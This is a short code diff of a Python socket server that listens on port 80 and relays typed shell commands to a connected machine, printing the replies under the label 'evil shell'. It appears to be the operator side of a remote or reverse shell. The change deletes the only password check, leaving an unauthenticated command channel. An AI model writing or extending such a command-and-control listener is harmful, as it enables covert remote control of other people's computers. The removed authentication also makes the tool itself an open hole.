@@ -11,7 +11,7 @@ HOST = "0.0.0.0"
 PORT = 80
 BUFFER = 1024
 # USER = ""
-CORRECT_PASS = "password"
+
 
 
 # server set up
@@ -32,33 +32,22 @@ def main():
     print(f"Connected by {address}")
     # authentication
     # username = input("Input your username: ")
-    password = input("Input your password: ")
-    incorrect_count = 0
-    while password != CORRECT_PASS:
-        incorrect_count += 1
-        password = input("Incorrect password. Please try again: ")
-        if incorrect_count == 3:
+  
+
+    while True:
+        # data = connect.recv(BUFFER).decode("UTF-8")
+        command = input("$ ")
+        if command == "":
             break
-
-    if incorrect_count == 3:
-        print("Incorrect password. Closing connection")
-        connect.close()
-
-    else: 
-        while True:
-            # data = connect.recv(BUFFER).decode("UTF-8")
-            command = input("$ ")
-            if command == "":
-                break
-            print("$ sending command")
-            connect.send(command.encode())
-            output = connect.recv(BUFFER).decode("UTF-8")
-            print("$ evil shell :3 > **********print results: ")
-            print(output)
-            
-            
-        print("closing connection")
-        connect.close()
+        print("$ sending command")
+        connect.send(command.encode())
+        output = connect.recv(BUFFER).decode("UTF-8")
+        print("$ evil shell :3 > **********print results: ")
+        print(output)
+        
+        
+    print("closing connection")
+    connect.close()
 
         
 
